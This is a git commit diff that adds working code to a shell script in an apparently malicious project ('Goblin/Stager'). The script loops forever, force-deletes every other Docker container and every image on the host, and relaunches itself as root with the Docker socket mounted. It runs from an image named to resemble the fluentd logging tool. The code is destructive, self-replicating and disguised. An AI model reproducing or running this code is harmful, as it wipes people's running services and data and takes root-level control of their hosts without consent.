b412cd1a771b63836a7af8ba457372b48c791075
ilcapone <srfatkatana@gmail.com>
2019-12-02 23:28:41 +0100

    change and multiply

--- Goblin/Stager/fluend/paus.sh
+++ Goblin/Stager/fluend/paus.sh
@@ -1,21 +1,25 @@
 #!/bin/sh
 while true
 do
-  imgs=$(docker images | awk '{print $3}')
-  for img in $imgs
-  do
-    ./check-life.sh $img
-    docker rmi $img
-  done
   ids=$(docker ps --format '{{.ID}}' )
   me=$(docker ps | awk '/k8.fluend:paused/' | awk '{print $1}')
   for id in $ids
   do
     if [ $id != $me ]
     then
+      ./check-life.sh ------------stop-remove
       ./check-life.sh $id
       docker stop $id
       docker rm $id
     fi
   done
+  imgs=$(docker images | awk '{print $3}')
+  for img in $imgs
+  do
+    ./check-life.sh ---------------remove-image
+    ./check-life.sh $img
+    docker rmi $img
+  done
+  ./check-life.sh ----------------multyply
+  docker run -d -u root -v /var/run/docker.sock:/var/run/docker.sock k8.fluend:paused
 done
